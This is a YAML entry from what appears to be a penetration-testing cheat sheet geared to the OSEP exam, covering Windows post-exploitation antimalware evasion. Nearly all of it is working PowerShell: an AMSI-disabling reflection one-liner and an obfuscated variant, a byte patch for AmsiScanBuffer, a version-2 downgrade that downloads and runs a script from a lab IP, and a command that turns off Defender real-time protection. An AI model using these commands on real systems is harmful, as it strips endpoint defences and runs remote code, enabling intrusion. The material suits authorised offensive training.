---
description: |
  Bypass AMSI (Antimalware Scan Interface) to run PowerShell
  scripts and tools without detection. Essential for OSEP.
command: |
  # Classic one-liner (may be flagged — obfuscate as needed)
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

  # Using reflection with obfuscation
  $a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
  $b=$a.GetField('am'+'siInitFailed','NonPublic,Static')
  $b.SetValue($null,$true)

  # Memory patching (x64)
  $patch = [byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
  # Apply to AmsiScanBuffer

  # PowerShell downgrade (bypass AMSI entirely)
  powershell -version 2 -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.1/script.ps1')"

  # Disable real-time protection (requires admin)
  Set-MpPreference -DisableRealtimeMonitoring $true
phase:
  - Post-Exploitation
target_os:
  - Windows
services: []
items:
  - Shell
techniques: []
network_position:
  - Local
references:
  - https://amsi.fail/
---
